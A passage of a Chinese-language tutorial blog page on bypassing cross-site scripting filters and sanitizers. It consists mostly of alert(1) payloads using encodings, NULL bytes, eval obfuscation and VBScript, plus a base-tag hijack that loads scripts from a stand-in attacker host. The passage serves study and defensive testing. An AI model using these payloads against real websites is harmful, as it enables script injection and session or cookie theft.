<h6 id="标签名称"><a href="#标签名称" class="headerlink" title="标签名称"></a>标签名称</h6><p>改变标签名称的大小写</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">iMg</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">alert(1)</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;a&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure>

<p>在任意位置插入 NULL 字节</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs html">&lt;[%00]img onerror=alert(1) src=&quot;a&quot;&gt;&lt;/[%00]img&gt;<br>&lt;i[%00]mg onerror=alert(1) src=&quot;a&quot;&gt;&lt;/i[%00]mg&gt;<br>&lt;!-此处的 %XX 格式表示某个字符的 ASCII 的十六进制编码-&gt;<br></code></pre></td></tr></table></figure>

<blockquote>
<p>NULL 常常可以有效应用防火墙的过滤，因为防火墙程序通常将 NULL 识别为字符串的终止符，从而无法发现 NULL 字节后的恶意插入；</p>
</blockquote>
<p>直接修改标签名称，以避开针对标签名称的过滤</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">x</span> <span class="hljs-attr">onclick</span>=<span class="hljs-string">alert(1)</span> <span class="hljs-attr">src</span>=<span class="hljs-string">a</span>&gt;</span>Click here<span class="hljs-tag">&lt;/<span class="hljs-name">x</span>&gt;</span><br></code></pre></td></tr></table></figure>

<p>劫持 base 标签，base 标签用来指定脚本源的域名，因此，如果应用程序有使用 base，并且在 base 之后的脚本引用，都是相对路径，那么可以在原来的 base 之后，插入一个新的 base ，将其指向攻击者自己的服务器，这样后续的脚本就会改向攻击者的服务器请求脚本；</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">base</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;http://mdattacker.net/badscripts/&quot;</span>&gt;</span><br>...<br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;goodscript.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br>&lt;!-通常 base 标签仅允许出现在 head 部分，但少数浏览器如 firefox 允许出现在页面的任何位置-&gt;<br></code></pre></td></tr></table></figure>

<p>使用一些特殊字符来替代空格，干扰过滤规则</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs html">&lt;img/onerror=alert(1) src=a&gt;<br>&lt;img[%09]onerror=alert(1) src=a&gt;<br>&lt;img[%0d]onerror=alert(1) src=a&gt;<br>&lt;img[%0a]onerror=alert(1) src=a&gt;<br>&lt;img/&quot;onerror=alert(1) src=a&gt;<br>&lt;img/&#x27;onerror=alert(1) src=a&gt;<br>&lt;img/anyjunk/onerror=alert(1) src=a&gt;       <br></code></pre></td></tr></table></figure>

<blockquote>
<p>即使在实施攻击时不需要任何标签属性，但应始终在标签名称后面添加一些多余的内容，因为这样可以避开一些简单的过滤，例如：&lt;img&#x2F;anyjunk&#x2F;onerror&#x3D;alert(1) src&#x3D;a&gt;</p>
</blockquote>
<h6 id="属性名称"><a href="#属性名称" class="headerlink" title="属性名称"></a>属性名称</h6><p>就像标签名称一样，也可以在属性的名称中使用 NULL 技巧，例如：&lt;img o[%00]nerror&#x3D;alert(1) src&#x3D;a&gt;，这样可以避开基于 on 开头的属性名称的过滤；</p>
<h6 id="属性分隔符"><a href="#属性分隔符" class="headerlink" title="属性分隔符"></a>属性分隔符</h6><p>属性的分隔一般使用空格，但实际上也可以使用双引号或者单引号（IE 上还可以使用重音符）；</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">&quot;alert(1)&quot;</span><span class="hljs-attr">src</span>=<span class="hljs-string">a</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">&#x27;alert(1)&#x27;</span> <span class="hljs-attr">src</span>=<span class="hljs-string">a</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">onerror</span>=`<span class="hljs-attr">alert</span>(<span class="hljs-attr">1</span>)` <span class="hljs-attr">src</span>=<span class="hljs-string">a</span>&gt;</span><br></code></pre></td></tr></table></figure>

<p>通过使用引号或者重音符来分隔属性，并在标签名称后面使用特殊符号来替代空格，则可以实现整个输入都没有使用任何空格的情况，从而避开一些简单的过滤</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html">&lt;img/onerror=&quot;alert(1)&quot;src=a&gt;<br></code></pre></td></tr></table></figure>

<h6 id="属性值"><a href="#属性值" class="headerlink" title="属性值"></a>属性值</h6><p>属性值同样也可以使用 NULL 技巧，并且还可以使用 HTML 编码字符对输入进行模糊处理</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">a[%00]alert(1)</span> <span class="hljs-attr">src</span>=<span class="hljs-string">a</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">a&amp;#x6c;ert(1)</span> <span class="hljs-attr">src</span>=<span class="hljs-string">a</span>&gt;</span><br>&lt;!-以下使用 HTML 编码对 javascript 伪源进行了编码-&gt;<br><span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">src</span>=<span class="hljs-string">j&amp;#x61;vasc&amp;#x72ipt&amp;#x3a;alert&amp;#x28;1&amp;#x29;</span>&gt;</span><br></code></pre></td></tr></table></figure>

<p>在使用 HTML 编码时，应注意到，浏览器支持多种编码变体，例如可以使用十进制或者十六进制格式，添加多余的前导零，并省略结尾分号等；</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs html">&lt;!-十六进制，前导零-&gt;<br><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">a&amp;#x06c;ert(1)</span> <span class="hljs-attr">src</span>=<span class="hljs-string">a</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">a&amp;#x006c;ert(1)</span> <span class="hljs-attr">src</span>=<span class="hljs-string">a</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">a&amp;#x0006c;ert(1)</span> <span class="hljs-attr">src</span>=<span class="hljs-string">a</span>&gt;</span><br>&lt;!-十进制，前导零，省略分号-&gt;<br><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">a&amp;108;ert(1)</span> <span class="hljs-attr">src</span>=<span class="hljs-string">a</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">a&amp;#0108;ert(1)</span> <span class="hljs-attr">src</span>=<span class="hljs-string">a</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">a&amp;#108ert(1)</span> <span class="hljs-attr">src</span>=<span class="hljs-string">a</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">a&amp;#0101ert(1)</span> <span class="hljs-attr">src</span>=<span class="hljs-string">a</span>&gt;</span><br></code></pre></td></tr></table></figure>

<h6 id="标签括号"><a href="#标签括号" class="headerlink" title="标签括号"></a>标签括号</h6><p>有些应用程序会对过滤后的输入进行不必要的 HTML 解码，例如</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-comment">&lt;!--实际输入如下，没有使用任何的括号，并使用 %25 和 %20 来代替 % 和空格--&gt;</span><br>%253cimg%20onerror=alert(1)%20src=a%253e<br><span class="hljs-comment">&lt;!--第一层解码，%25 和 %20 被转换为实际的百分符和空格，变成如下--&gt;</span><br>%3cimg onerror=alert(1) src=a%3e<br><span class="hljs-comment">&lt;!--由于应用程序会对输入进行 HTML 解码，导致最终呈现在浏览器中的输入变成如下字符--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">alert(1)</span> <span class="hljs-attr">src</span>=<span class="hljs-string">a</span>&gt;</span><br></code></pre></td></tr></table></figure>

<p>有些应用程序会将不常见的 Unicode 字符转换为相近的 ASCII 字符进行处理，例如双尖括号会转移为单尖括号，从而有机会避开过滤规则；</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs html">&lt;<span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">alert(1)</span> <span class="hljs-attr">src</span>=<span class="hljs-string">a</span>&gt;</span>&gt;<br>%u00ABimg onerror=alert(1) src=a%u00BB<br></code></pre></td></tr></table></figure>

<p>很多过滤规则的算法比较简单，例如简单的匹配起始和结束的尖括号，提取内容，并将其与黑名单进行比较，来识别 HTML 标签，此时可以使用多余的括号来避开过滤（前提是浏览器接受这种多余的括号）</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html">&lt;<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">alert</span>(<span class="hljs-number">1</span>);<span class="hljs-comment">//&lt;&lt;/srcipt&gt;</span></span><br></code></pre></td></tr></table></figure>

<blockquote>
<p>由于历史原因，有大量的合法的网站，使用不规范的 HTML 格式，而浏览器为了尽可能的兼容它们以进行正确的显示，导致浏览器接受各种不合法的 HTML 内容格式，并自动将其转换为规范的格式，这就为漏洞留下了大量的机会；可使用浏览器自带的工具，如“查看生成的源”，来查看浏览器如何转换一些不规范的格式；</p>
</blockquote>
<h6 id="字符集"><a href="#字符集" class="headerlink" title="字符集"></a>字符集</h6><p>使用不同的字符集来编码输入，常常可以避开过滤规则，不过它的挑战在于如何让浏览器按正确的字符集进行解析，一般需要能够控制 HTTP 响应头，例如 Content-Type 属性，或者对应的 HTML 元标签；</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-comment">&lt;!--对 &lt;script&gt;alert(document.cookie)/&lt;/script&gt; 在不同字符集下的编码--&gt;</span><br></code></pre></td></tr></table></figure>

<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210305085037.png" srcset="/img/loading.gif" lazyload></p>
<p> 如果应用程序默认支持使用多字节的字符集，例如 Shift-JIS，则可以在输入中使用在该字符集中具有特殊意义的字符，来避开输入过滤</p>
<p>例如某个应用程序支持 Shift-JIS 字符集，并在返回的响应中包括如下内容：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-comment">&lt;!--用户输入1 和 用户输入2 两个位置可以根据用户输入显示的内容--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;image.gif&quot;</span> <span class="hljs-attr">alt</span>=<span class="hljs-string">[</span>&quot;<span class="hljs-attr">用户输入位置1</span>&quot;] /&gt;</span> ...[&quot;用户输入位置2&quot;]<br></code></pre></td></tr></table></figure>

<p>假设应用程序的过滤规则限制了在用户输入位置1使用引号，并在用户输入位置2限制使用尖括号，则此时可以将输入1和输入2分别设计为如下：</p>
<ul>
<li>输入1： %f0</li>
<li>输入2：”onload&#x3D;alert(1);</li>
</ul>
<p>根据 Shift-JIS 字符集，%f0 后面的引号，将被解析为 %f0 的组成部分，从而使用原本 HTML 属性中的引号失去作用，之后一直到输入2的位置的引号才完成配对，从而成功的插入了 onload&#x3D;alert(1) 语句；</p>
<blockquote>
<p>较少用的字符集包括：Shift-JIS、EUC-JP、BIG5 等；</p>
</blockquote>
<h5 id="避开过滤：脚本代码"><a href="#避开过滤：脚本代码" class="headerlink" title="避开过滤：脚本代码"></a>避开过滤：脚本代码</h5><p>有些过滤规则会对输入中的 javascript 敏感字符进行过滤，例如分号、圆括号、圆点等；此时需要对这些关键符号先进行模糊处理才行，常见的处理办法如下：</p>
<h6 id="转义"><a href="#转义" class="headerlink" title="转义"></a>转义</h6><p>javascript 支持多种转义方法，因此可以使用这些方法，对关键字符进行转义处理；</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-comment">&lt;!--对字母 L 进行 Unicode 转义 --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>a\u006cert(1);<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure>

<p>如果能够使用 eval 命令，则可以将需要执行的代码，弄成字符串，传给 eval 命令实现执行；</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-built_in">eval</span>(<span class="hljs-string">&#x27;a\u006cert(1)&#x27;</span>);</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span> // Unicode 转义<br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-built_in">eval</span>(<span class="hljs-string">&#x27;a\x6cert(1)&#x27;</span>);</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span> // 十六进制转义<br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-built_in">eval</span>(<span class="hljs-string">&#x27;a\154ert(1)&#x27;</span>);</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span> // 十进制转义<br><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-built_in">eval</span>(<span class="hljs-string">&#x27;a\l\ert&#x27;</span>(<span class="hljs-number">1</span>\);</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span> // 字符串中带转义符将会被忽略<br></code></pre></td></tr></table></figure>

<h6 id="动态构建字符串"><a href="#动态构建字符串" class="headerlink" title="动态构建字符串"></a>动态构建字符串</h6><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-built_in">eval</span>(<span class="hljs-string">&#x27;al&#x27;</span>+<span class="hljs-string">&#x27;ert(1)&#x27;</span>;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-built_in">eval</span>(<span class="hljs-title class_">String</span>.<span class="hljs-title function_">fromCharCode</span>(<span class="hljs-number">97</span>,<span class="hljs-number">108</span>,<span class="hljs-number">101</span>,<span class="hljs-number">114</span>,<span class="hljs-number">116</span>,<span class="hljs-number">40</span>,<span class="hljs-number">49</span>,<span class="hljs-number">41</span>));</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-built_in">eval</span>(<span class="hljs-title function_">atob</span>(<span class="hljs-string">&#x27;amF2YXNjcmlwdDphbGVydCgxKQ&#x27;</span>));</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span> // Base64 编码的方式<br></code></pre></td></tr></table></figure>

<h6 id="替代-eval-的方法"><a href="#替代-eval-的方法" class="headerlink" title="替代 eval 的方法"></a>替代 eval 的方法</h6><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-string">&#x27;alert(1)&#x27;</span>.<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/.+/</span>,<span class="hljs-built_in">eval</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span> // 字符串的内置函数+正则替换<br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-attr">function</span>::[<span class="hljs-string">&#x27;alert&#x27;</span>](<span class="hljs-number">1</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure>

<h6 id="替代圆点"><a href="#替代圆点" class="headerlink" title="替代圆点"></a>替代圆点</h6><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">alert</span>(<span class="hljs-variable language_">document</span>[<span class="hljs-string">&#x27;cookie&#x27;</span>]</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span> // 使用中括号访问对象属性的方法<br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">with</span>(<span class="hljs-variable language_">document</span>)<span class="hljs-title function_">alert</span>(cookie)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span> // 使用 with 语法<br></code></pre></td></tr></table></figure>

<h6 id="组合多种技巧"><a href="#组合多种技巧" class="headerlink" title="组合多种技巧"></a>组合多种技巧</h6><p>例如先使用 Unicode 对关键字进行转义，然后再使用 HTML 编码将 Unicode 用到的反斜杠进行编码，以避开过滤；</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">eval(</span>&#x27;<span class="hljs-attr">al</span>&amp;#<span class="hljs-attr">x5c</span>;<span class="hljs-attr">u0065rt</span>(<span class="hljs-attr">1</span>)&#x27;) <span class="hljs-attr">src</span>=<span class="hljs-string">a</span>&gt;</span> // 此处对 alert 单词中的 e 字母先用 Unicode 进行转义，然后再将 Unicode 转义中用到反斜杠进行 HTML 编码，<br></code></pre></td></tr></table></figure>

<p>此外还可以对 onerror 属性值中的任何字符进行 HTML 编码，以便进一步隐藏攻击；</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210306114628.png" srcset="/img/loading.gif" lazyload></p>
<p>很多针对 Javascript 的过滤规则一般会核查 Javascript 中使用到的关键字符，例如引号、点号、括号等，对这些符号使用 HTML 编码后，就可以避开过滤规则；</p>
<h6 id="使用-VBScript"><a href="#使用-VBScript" class="headerlink" title="使用 VBScript"></a>使用 VBScript</h6><p>通常 XSS 攻击都是使用 Javascript 语言来插入恶意脚本，但是有些浏览器除了支持 Javascript 外，还支持其他语言，例如 IE 浏览器支持 VBSript；因此，如果存在此种情况，则攻击者可以根据 VBSript 的语法语法特征来设计攻击脚本，以避开过滤规则；</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">language</span>=<span class="hljs-string">vbs</span>&gt;</span>MsgBox 1<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">&#x27;vbs:MsgBox 1&#x27;</span> <span class="hljs-attr">src</span>=<span class="hljs-string">a</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">oneeror</span>=<span class="hljs-string">MsgBox+1</span> <span class="hljs-attr">language</span>=<span class="hljs-string">vbs</span> <span class="hljs-attr">src</span>=<span class="hljs-string">a</span>&gt;</span> // Msgbox 之后接的加号表示空格，用来针对空格的过滤<br>// 以上例子的 vbs 字样，同时还可以替换为 vbsript 字样，二者的效果是一样<br></code></pre></td></tr></table></figure>

<p>VBSript 的一些特点：</p>
<ul>
<li>不使用括号也可以实现函数的调用（可避开针对括号的过滤）；</li>
<li>不区分大小写（Javascript 语法规则要求表达式需要使用小写，不支持大写，可绕开进行大写转换的净化规则）；</li>
</ul>
<h6 id="组合-Javascript-和-VBSript"><a href="#组合-Javascript-和-VBSript" class="headerlink" title="组合 Javascript 和 VBSript"></a>组合 Javascript 和 VBSript</h6><p>可以设计从  Javascript 中调用 VBScript，或者反过来也行，从而增加攻击的复杂度，以避开过滤规则；</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">execScript</span>(<span class="hljs-string">&quot;MsgBox 1&quot;</span>, <span class="hljs-string">&quot;vbscript&quot;</span>);</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">language</span>=<span class="hljs-string">vbs</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">execScript</span>(<span class="hljs-string">&quot;alert(1)&quot;</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br>// 以下是一个嵌套使用两种脚本的复杂示例<br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">execScript</span>(<span class="hljs-string">&#x27;execScript&quot;alert(1)&quot;, &quot;javascript&quot;&#x27;</span>, <span class="hljs-string">&quot;vbscript&quot;</span>);</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure>

<p>由于 VBSript 不区分大小写，即使输入被全部转换成大写后，仍然可以被浏览器执行，这意味着如果想实现 Javascript 的调用，可以使用 VBSript 脚本，调用内置的 LCASE 函数，将被净化规则转换后的大写，再次转换成小写来实现；</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">SCRIPT</span> <span class="hljs-attr">LANGUAGE</span>=<span class="hljs-string">VBS</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">EXECSCRIPT</span>(<span class="hljs-title function_">LCASE</span>(<span class="hljs-string">&quot;ALERT(1)&quot;</span>))</span><span class="hljs-tag">&lt;/<span class="hljs-name">SCRIPT</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">IMG</span> <span class="hljs-attr">ONERROR</span>=<span class="hljs-string">&quot;VBS:EXECSCRIPT LCASE(&#x27;ALERT(1)&#x27;)&quot;</span> <span class="hljs-attr">SRC</span>=<span class="hljs-string">A</span>&gt;</span><br></code></pre></td></tr></table></figure>

<h6 id="使用经过编码的脚本"><a href="#使用经过编码的脚本" class="headerlink" title="使用经过编码的脚本"></a>使用经过编码的脚本</h6><p>早期微软在 IE 浏览器中，使用某种定制的脚本编码，对脚本进行模糊处理，以防止用户查看 HTML 页面的源代码，但后面该编码被破解了，导致了额外的一个漏洞，即攻击者可以根据该编码规则，先对输入进行模糊处理，以避开过滤规则，然后输入最终又会被浏览器解码成正确的脚本内容；</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210306120830.png" srcset="/img/loading.gif" lazyload></p>
<h5 id="避开净化"><a href="#避开净化" class="headerlink" title="避开净化"></a>避开净化</h5><blockquote>
<p>净化是一种防守策略，不过貌似直接拒绝请求，并根据情况加入黑名单不是更好？</p>
</blockquote>
<p> 净化是一种应对攻击的常用策略，其中一种常见的方法是将输入进行 HTML 编码，这样就可以避免输入的脚本被浏览器执行；有时候，应用程序甚至会删除输入中的特定字符，以清除其中可能包含的恶意内容；此时需要做两件事情：</p>
<ul>
<li>了解程序对哪些字符实施了净化规则，然后组合多种技巧避开它们；</li>
<li>了解输入内容被净化后，余下的内容有无可能实施攻击</li>
</ul>
<p>净化算法经常有漏洞，例如：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs html">// 只替换了第一个匹配值<br>输入：<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-handlebars"><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>alert(1)</span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br>结果：<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>alert(1)<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br>// 没有递归<br>输入：&lt;src<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>ipt&gt;alert(1)<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br>结果：<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>alert(1)<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br>// 对多个关键字实施净化时，使用固定的处理顺序，因此攻击者可以利用该顺序，让第一个步骤未能找到匹配值，然后利用第二个步骤的净化结果，得到想要插入的正确脚本<br>输入：&lt;src<span class="hljs-tag">&lt;<span class="hljs-name">object</span>&gt;</span>ipt&gt;alert(1)<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br>结果：<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>alert(1)<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br>// 净化规则会转义引号，但未转义反斜杠本身，因此，攻击者可以在输入中加入反斜杠，对净化规则添加的反斜杠进行转义，使其失效；<br>输入：var a = foo\&quot;; alert(1); //<br>结果：var a = &quot;foo\\&quot;; alert(1);//&quot;;<br><br>// 未处理尖括号，攻击者有机会利用转义会废弃原脚本，原因：浏览器会优先解析 HTML 标签，再处理 js 脚本<br>输入：<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>alert(1)<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br>结果：<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"> <span class="hljs-keyword">var</span> a = <span class="hljs-string">&quot;</span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>alert(1)<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>&quot;<br>// 虽然此处变量 a 的声明中只包含1个引号，不符合 js 语法，可能会出现报错，但问题不大，因为浏览器会跳过，直接执行下一段脚本<br><br>// 如果注入的位置处于事件中，则可以使用 HTML 编码来避开净化<br>位置 foo：<span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span> <span class="hljs-attr">onclick</span>=<span class="hljs-string">&quot;var a = 